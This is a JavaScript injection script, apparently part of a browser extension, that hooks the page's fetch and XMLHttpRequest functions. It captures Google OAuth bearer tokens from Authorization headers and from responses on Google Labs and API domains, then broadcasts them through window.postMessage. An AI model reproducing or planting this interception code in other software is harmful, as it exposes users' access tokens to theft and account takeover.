(() => {
  if (window.__BIGBOMB_FLOW_CAPTURE__) return;
  window.__BIGBOMB_FLOW_CAPTURE__ = true;

  window.postMessage({ source:"BIGBOMB_FLOW",type:"READY" },location.origin);

  const publishToken = (token) => {
    if (typeof token !== "string" || !token.startsWith("ya29.") || token.length < 30) return;
    window.postMessage({ source:"BIGBOMB_FLOW",type:"TOKEN",token },location.origin);
  };

  const publishHeader = (value) => {
    const match = String(value || "").match(/^Bearer\s+(ya29\.[A-Za-z0-9._~-]+)$/i);
    if (match) publishToken(match[1]);
  };

  const inspectAuthPayload = (url,text) => {
    if (!/flow\.google|labs\.google|googleapis\.com/i.test(String(url || ""))) return;
    const match = String(text || "").match(/ya29\.[A-Za-z0-9._~-]{20,}/);
    if (match) publishToken(match[0]);
  };

  const inspectHeaders = (headers) => {
    if (!headers) return;
    try { publishHeader(new Headers(headers).get("authorization")); } catch {}
  };

  const originalFetch = window.fetch.bind(window);
  window.fetch = function bigBombFlowFetch(input,init) {
    try {
      inspectHeaders(init?.headers);
      if (input instanceof Request) inspectHeaders(input.headers);
    } catch {}
    const url = typeof input === "string" ? input : input instanceof URL ? input.href : input?.url;
    
    // Log request to local server
    try {
      let bodyToLog = "<no body>";
      if (init && init.body) {
         if (typeof init.body === "string") bodyToLog = init.body.substring(0, 500);
         else if (init.body instanceof URLSearchParams) bodyToLog = init.body.toString().substring(0, 500);
         else bodyToLog = "<binary or other body>";
      }
      
    } catch(e) {}

    return originalFetch(input,init).then((response) => {
      try {
        const contentType = response.headers.get("content-type") || "";
        const contentLength = Number(response.headers.get("content-length") || 0);
        if ((/json|text|javascript/i.test(contentType) || !contentType) && (!contentLength || contentLength < 2_000_000)) {
          response.clone().text().then((text) => inspectAuthPayload(url,text)).catch(() => {});
        }
      } catch {}
      return response;
    });
  };

  try {
    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.open = function(method,url,...rest) {
      this.__bigBombFlowUrl = String(url || "");
      this.__bigBombMethod = method;
      this.addEventListener("load",() => {
        try {
          if (typeof this.responseText === "string" && this.responseText.length < 2_000_000) inspectAuthPayload(this.__bigBombFlowUrl,this.responseText);
        } catch {}
      });
      return originalOpen.call(this,method,url,...rest);
    };
    const originalSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {
      try {
        let bodyToLog = "<no body>";
        if (body) {
           if (typeof body === "string") bodyToLog = body.substring(0, 500);
           else bodyToLog = "<binary or other body>";
        }
        
      } catch(e) {}
      return originalSend.call(this, body);
    };
    XMLHttpRequest.prototype.setRequestHeader = function(name,value) {
      if (String(name).toLowerCase() === "authorization") publishHeader(value);
      return originalSetRequestHeader.call(this,name,value);
    };
  } catch {}
})();
